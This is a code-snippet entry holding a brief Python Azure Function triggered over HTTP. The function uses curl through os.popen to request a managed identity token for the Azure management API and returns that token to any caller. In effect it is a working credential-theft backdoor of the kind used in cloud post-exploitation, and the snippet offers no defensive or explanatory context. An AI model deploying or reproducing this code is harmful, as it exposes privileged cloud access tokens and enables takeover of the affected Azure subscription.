---
id: 4d21b2c8-fb61-4eb4-b0c6-8358cd8e6f6f
type: code
language: Python
verified: false
created_at: '2023-05-24T16:05:50.821060+00:00'
updated_at: '2023-05-24T16:05:50.839431+00:00'
---

# Code Snippet 4d21b2c8

**Language**: Python

```python
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
```
